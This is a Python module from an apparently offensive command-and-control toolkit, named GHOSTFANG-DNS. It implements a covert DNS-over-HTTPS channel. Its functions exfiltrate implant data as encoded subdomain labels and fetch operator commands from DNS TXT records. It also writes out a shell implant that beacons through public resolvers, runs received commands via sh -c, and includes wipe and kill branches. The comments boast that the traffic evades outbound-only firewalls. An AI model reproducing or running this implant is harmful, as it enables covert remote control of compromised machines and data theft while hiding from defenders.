"""quantum.c2.agents.ghostdns — GHOSTFANG-DNS DoH-egress agent + tasking."""
from __future__ import annotations

import base64
import json
import os
import time

from quantum.core.env import QCLI_DIR
from quantum.core.logging import log
from quantum.recon.doh import DoH


def doh_reverse_beacon(host_id, data, domain):
    """Implant-side reverse-DoH egress: beacon data rides as subdomain labels
    encrypted base32 through public DoH resolvers (443/tcp), reaching a web-app
    or authoritative DNS capture point. NO inbound ports required — the implant
    only ever makes outbound lookups that look like cache-miss DNS."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    b32 = base64.b32encode(data).decode().rstrip("=").lower()
    chunks = [b32[i:i+60] for i in range(0, len(b32), 60)]
    try:
        for b in chunks:
            info = f"{host_id}.{b}.{domain}"
            _ = DoH().resolve(info[:253], rtype="A")
        return {"beacon_bytes": len(data), "chunks": len(chunks)}
    except Exception as e:
        log(f"doh_reverse_beacon: {e}", "WARN")
        return {"error": str(e)}


def doh_task_check(domain, host_id="hq"):
    """HQ-side: read next command from operator-controlled DNS TXT records.
    Set the TXT record at `{host_id}.cmd.{domain}` OR `cmd.{domain}`.
    Returns the task dict or None. This is how implants stay tasked even with
    no inbound C2 — public resolvers only see benign recursive lookups."""
    try:
        for name in (f"{host_id}.cmd.{domain}", f"cmd.{domain}"):
            answers = DoH().resolve(name, rtype="TXT")
            for ans in answers:
                try:
                    raw = ans.get("data", "").strip('"')
                    if raw.startswith("{"):
                        return json.loads(raw)
                except Exception:
                    continue
    except Exception:
        pass
    return None


def generate_dns_agent(domain, interval=60):
    """GHOSTFANG-DNS: the no-port-forward POSIX/Linux agent. Beacon exfil via
    DoH label encoding; command intake via DNS TXT. Survives outbound-only
    firewall policies (all traffic is 443/tcp to 1.1.1.1/8.8.8.8)."""
    script = f"""#!/bin/sh
# GHOSTFANG-DNS {int(time.time())} — DoH-egress agent (no inbound ports needed)
QD="{domain}"
HOST="$(hostname 2>/dev/null || echo dns-$(id -u))"
ID=$(echo -n "$HOST" | head -c 12 | tr -c 'a-z0-9' 'x')
b32() {{ dd bs=1 count=$1 2>/dev/null | base64 | tr -d '\\n' | tr '+' '-' | tr '/' '_'; }}
beacon() {{
  curl -s -m 10 -H 'accept: application/dns-json' \\
    "https://cloudflare-dns.com/dns-query?name=$ID.$(echo ok|b32 2).$QD&type=A" >/dev/null 2>&1 || \\
  curl -s -m 10 "https://dns.google/resolve?name=$ID.$QD&type=A" >/dev/null 2>&1
}}
task() {{
  curl -s -m 10 "https://dns.google/resolve?name=cmd.$QD&type=TXT" 2>/dev/null | \\
    grep -o '"data":"[^"]*"' | head -1 | cut -d'"' -f4
}}
while :; do
  beacon
  T=$(task | tr -d '"' | tr -d '\\\\')
  case "$T" in
    *'"'*'}}'*) C=$(echo "$T" | sed -n 's/.*"cmd":"\\([^"]*\\)".*/\\1/p'); [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &) ;;
    wipe) rm -f /var/tmp/.gn-* ~/.qcli* ;; kill) rm -f /var/tmp/.gn-*; kill $$ ;;
  esac
  sleep {interval}
done
"""
    fn = os.path.join(QCLI_DIR, "ghostdns.sh")
    open(fn, "w").write(script)
    try: os.chmod(fn, 0o755)
    except Exception: pass
    log(f"GHOSTFANG-DNS agent generated -> ghostdns.sh (domain {domain})", "C2")
    return fn
